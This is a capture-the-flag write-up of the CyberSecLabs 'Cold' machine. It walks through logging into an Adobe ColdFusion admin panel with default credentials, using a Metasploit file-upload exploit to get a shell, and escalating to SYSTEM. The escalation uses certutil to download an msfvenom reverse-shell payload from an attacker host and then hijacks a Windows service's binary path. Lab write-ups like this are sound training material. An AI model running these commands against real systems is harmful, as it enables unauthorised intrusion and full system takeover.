# CyberSecLabs: Cold 172.31.1.15

Okay, the box name itself was a hint that there is somehow ```Adobe Coldfusion``` involved in here.

**Apologies I cannot paste my nmap scan here as I had a cyclone here and had to close down my system and didnot have the patience to re do it.** 

After running the nmap scan, I see port 8500 has ```404``` page. I used a tool called ```diresearch``` to fuzz the directories

```zsh
python3 dirsearch.py -url http://172.31.1.15:8500 -r - R 3
```

As it was fuzzing, I noticed this url:```http://172.31.1.15:8500/CFIDE/administrator/```

That was the hit. Simply browsed to the URL, entered the pass admin and admin and worked. It is ```Adoble Coldfusion 2018```. 

```zsh
searchsploit coldfusion
```
This is the right exploit ```multiple/webapps/45979.txt``` from the results. Strangely, I was not able to do it manually. I fired a listener to burp and redirected everything via that listener to check my metasploit request later, it was the same. I will look into it soon but for now, we will use metasploit. 

Fire up msfconsole and search for coldfusion. Use this module ```exploit/multi/http/coldfusion_ckeditor_file_upload``` And simply modify the RHOST to the IP of the machine, Modify LHOST to your CSEClab VPN IP. Fire the exploit. You will have a user shell(jade). Quickly, grab the user flag


Now moving on to privesc, use certutil to upload ```WinPEASany```

Did a ```systeminfo``` to see it was a ```Microsoft Windows Server 2012 R2 Standard``` and 64-bit.

Also did a whoami /priv and saw that the ```SeImpersonatedToken``` was enabled. But sadly Juicy Potato doesnot work :(


Host the winpeas file using:
```zsh
python -m SimpleHTTPServer 8000
```

```zsh
certutil -urlcache -split -f http://10.10.0.40:8000/WinPEASany.exe 
```
Now run winPEAS on the machine. I uploaded it to the %TEMP% directory.
Simply %TEMP% to go to the temp dir.

```cmd
.\winPEASany.exe -quiet
```
I found this interesting stuff. ```Unattended XML``` was there, checked it but there was no saved password.

Now, I noticed this in the winPEAS output:
```LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:cold: WriteData/CreateFiles```

The location of Cold has ```Unquoted Service Path```

```cmd
sc query cold
``` 
I see it has a DEMAND Start and is stopped, you can use accesschk to do that too. 

Now I simply updated the ```BINARY_PATH_NAME``` and replaced it with my reverse shell generated by msfvenom using:

```zsh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.40 LPORT=4445 -f exe -o Service.exe
 ```

Uploaded it using certutil in the TEMP directory

```cmd
certutil -urlcache -split -f http://10.10.0.40:8000/Service.exe
```

Now to change the binary path

```cmd
sc config cold binpath= "\"C:\Users\jade\AppData\Local\Temp\Service.exe\"" 
```
It was a success ```[SC] ChangeServiceConfig SUCCESS```.

Now, I started a listener using:

```zsh
rlwrap nc -lvnp 4445
```

And in the Windows shell, I started the service.

```cmd
net start cold
```
POP ! There you have a shell with SYSTEM Privilege !!!!!